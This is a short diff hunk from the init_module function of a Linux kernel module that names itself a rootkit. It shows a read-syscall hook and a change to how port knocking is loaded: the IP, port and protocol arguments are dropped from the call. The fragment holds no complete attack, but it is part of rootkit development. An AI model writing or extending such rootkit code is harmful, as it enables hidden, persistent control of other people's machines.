@@ -33,7 +33,7 @@ int init_module (void)
 	hook_read();
 	
 	/* load port knocking */
-	ret = load_port_knocking(input_ip, (unsigned) port, prot);	
+	ret = load_port_knocking();	
 	if(ret < 0) {
 		ROOTKIT_DEBUG("Error while loading port knocking! Aborting insertion.\n");
 		return ret;
